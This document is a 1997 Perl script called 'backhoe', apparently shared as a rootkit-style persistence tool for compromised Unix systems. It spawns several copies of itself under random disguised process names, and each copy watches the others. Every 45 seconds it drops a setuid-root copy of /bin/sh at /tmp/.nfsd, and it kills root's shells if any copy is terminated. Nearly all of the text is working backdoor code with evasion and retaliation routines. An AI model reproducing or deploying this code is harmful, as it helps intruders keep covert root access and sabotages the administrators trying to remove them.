#!/usr/bin/perl
# backhoe
# written by miff
# this little ho periodically places a rootshell in /tmp
# (you set the frequency), spawns multiple copies of itself,
# disguises itself, watches for its brothers, and
# kills root if any brothers die.
# modified to using signaling to check for brothers, and to
# use double forking rather than execing a new copy
# also cleaned up shell spawning....
# added disguise routine to make the bros harder to kill
# all at once...
# version 2 complete 8/20/97


&set_vars; #we do this again in intialize, but need it here...
#fork progs until we reach our desired num:
while ($famsize > 1) {
        &forker;
        $famsize--;
        }
&initialize;
&controlfreak;  #we should never return from this one...
die "big problems - you are where you should not be... ";


# subs start here...
#**********************************************************************
# THIS IS THE ONLY SECTION YOU NEED TO MESS WITH
sub set_vars {
#set needed variables:
#number of brothers:
$famsize = 4; #how many additional brothers will there be...
$rootid = 0; #this is the id of root (0) - useful to set other for debug
$shelltime = 15;  # this tells us to leave the rootshell out for 15 seconds
$sleeptime = 45;  #this tells the prog to sleep 45 seconds between rootshells
$paranoid = 0; # set this if you want to kill *all* shells, not just root
# ^^^ not currently implemented
#@psnames = ('vi','nfsiod','kflushd','kswapd','update','lpd','/usr/sbin/rpc.mountd','/usr/sbin/rpc.nfsd','0wned');
@psnames = ('dickhead','shitface','fuck','diebitch','x0x','phucewe','mountme','shitd','0wned');
#note:  prolly wanna change the psnames array when really using this.
}
#**********************************************************************
#**********************************************************************
#**********************************************************************

sub initialize {
#set key vars, write pid, read pids, enter main controller.
&set_vars;
&disguise;  # give ourselves a better ps name...
&scent;
sleep 2;  #give bros a chance to leave scent before reading pids
# this gives us 2 seconds of initial vulnerability - big deal
&fraternize;
}

sub disguise {
#here we will randomly set the process name...
srand(time ^ $$);
$randum = int(rand(9));
$0 = $psnames[$randum];
}

sub controlfreak {
$end = 0;
$slept = 0;
$shell = 0;
while ($end < 1) {
        &check_bro;
        sleep 1;
        ++$slept;
        if ($shell == 0 && $slept > $sleeptime) {
                &make_shell;
                $slept = 0;
                $shell = 1;
        }
        if ($shell == 1 && $slept > $shelltime) {
                &kill_shell;
                $slept = 0;
                $shell = 0;
        }

}
}

sub panic {
#here we want to kill roots, fork new, reinitialize...
&kill_roots;
&set_vars;  #need to get famsize again...  (this will grow..)
#fork progs until we reach our desired num:
while ($famsize > 1) {
        &forker;
        $famsize--;
        }
&initialize;
&kill_roots;
#we should now have at least as many bros as we need, they have re-read
# the temp file and are checking new pids.
}

#here we leave our scent (ps num) in the /tmp file...
sub scent {
open PSLOG, '>>/tmp/31336.tmp';   #perhaps this should become a var...
print PSLOG "$$-";  #append our ps num and a separator dash
close PSLOG;  #close it
}

#here we read the pslog to find our brethren's ids,
#then we rm the pslog (tho in fact only one bro will get to do this)
sub fraternize {
open (PSLIST, '/tmp/31336.tmp') || die "no ps list!!!\n";  # change this to panic...
@brolist = split("-",<PSLIST>);  #build our brotha array...
close PSLIST;
sleep (4);  #give other bros a chance to read it...
#(another 4 second vulnerability....)
if (-e '/tmp/31336.tmp') { unlink '/tmp/31336.tmp';} #rm that baby...
#again, consider using variables here...
}


sub check_bro {
#all new check bro routine!!!  (much smaller :):):) )
# check using signals to make sure our frendz live on...
$ok = 0;

foreach $ps (@brolist) {
        unless (kill 0,$ps)  { &panic;}
        }
}

sub make_shell {
#simplified by removing directory...
unless (-e '/tmp/.nfsd') {
        system ('cp /bin/sh /tmp/.nfsd');
        system ('chmod 4755 /tmp/.nfsd');
        }

#system ('touch -t 031320251996 /tmp/.nfsd); #old date changer - out for now
}

sub kill_shell {
if (-e '/tmp/.nfsd') {
        unlink '/tmp/.nfsd';  #a better shell killer...
        }
}

sub kill_roots {
#this modified from jacob's shit...
#note:  since the last version, array now begins wit 0, so all
#field numbers are decremented...
open( PSK, "ps -jax |");
while ($xx = <PSK>)
        {
        chop ($xx);
        @info = split(" ", $xx, 10);
        if ($info[7] == $rootid && $info[9] =~ 'sh')  {
                unless ($info[9] =~ 'flush') {kill 9,$info[1];}
                }
         }
close(PSK);
}



sub forker {
#we need to double fork here..... (but not right now)
$spawn_id = fork();
die "fork failed: $!" unless defined $spawn_id;
if ($spawn_id) {
        #we are the parent - woo hoo
        waitpid($spawn_id,0);
  }
else {
        #we be da chile - woo hoo
        $dfork = fork();
        die "double fork failed $!" unless defined $dfork;
        if ($dfork)  {
                #we are the intermediary - must die!!!
                exit 0; }
        $famsize = 0;
  }
}


